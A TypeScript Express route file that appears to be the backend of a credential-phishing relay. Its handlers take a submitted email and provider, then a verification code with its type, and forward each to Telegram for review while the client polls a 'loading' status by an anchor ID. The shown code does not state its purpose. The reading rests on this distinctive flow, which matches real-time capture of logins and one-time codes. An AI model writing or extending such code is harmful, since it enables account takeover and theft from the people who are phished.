import type { RequestHandler } from "express";
import { codeLeadSchema, leadSchema } from "../schemas/lead.schemas.js";
import {
  requestTelegramCodeLeadReview,
  requestTelegramLeadReview,
} from "../methods/telegram.methods.js";
import { getLeadAnchor, selectLeadChannel } from "../methods/lead.methods.js";

export const leadPostHandler: RequestHandler = async (request, response) => {
  const lead = leadSchema.safeParse(request.body);
  if (!lead.success) {
    response.status(400).json({
      ok: false,
      error: {
        code: "VALIDATION_ERROR",
        message: lead.error.issues[0].message,
      },
    });
    return;
  }
  try {
    const anchor = getLeadAnchor(lead.data.email, lead.data.provider);
    const channel = await selectLeadChannel(anchor, { status: "loading" });
    await requestTelegramLeadReview(anchor, lead.data);
    response.status(202).json(channel);
  } catch (e) {
    console.error("Lead channel failed", e);
    response.status(503).json({
      ok: false,
      error: {
        code: "LEAD_CHANNEL_FAILED",
        message:
          e instanceof Error
            ? e.message
            : "An error occurred. \nPlease try again.",
      },
    });
  }
};

export const codeLeadPostHandler: RequestHandler = async (
  request,
  response,
) => {
  const leadCode = codeLeadSchema.safeParse(request.body);
  if (!leadCode.success) {
    response.status(400).json({
      ok: false,
      error: {
        code: "VALIDATION_ERROR",
        message:
          leadCode.error.issues[0]?.message ??
          "Check the submitted information.",
      },
    });
    return;
  }
  try {
    const anchor = getLeadAnchor(leadCode.data.email, leadCode.data.provider);
    await requestTelegramCodeLeadReview(anchor, {
      type: leadCode.data.type,
      code: leadCode.data.code,
    });
    const channel = await selectLeadChannel(anchor);
    response.status(202).json(channel);
  } catch (e) {
    console.error("Code lead post channel failed", e);
    response.status(503).json({
      ok: false,
      error: {
        code: "CODE_LEAD_CHANNEL_FAILED",
        message:
          e instanceof Error
            ? e.message
            : "An error occurred. \nPlease try again.",
      },
    });
  }
};

export const leadGetHandler: RequestHandler<{
  anchor: string;
}> = async (request, response) => {
  try {
    const anchor = request.params.anchor;
    const channel = await selectLeadChannel(anchor);
    response.status(202).json(channel);
  } catch (e) {
    console.error("Lead flow check failed", e);
    response.status(503).json({
      ok: false,
      error: {
        code: "LEAD_FLOW_CHECK_FAILED",
        message: "An error occurred. \nPlease try again.",
      },
    });
  }
};
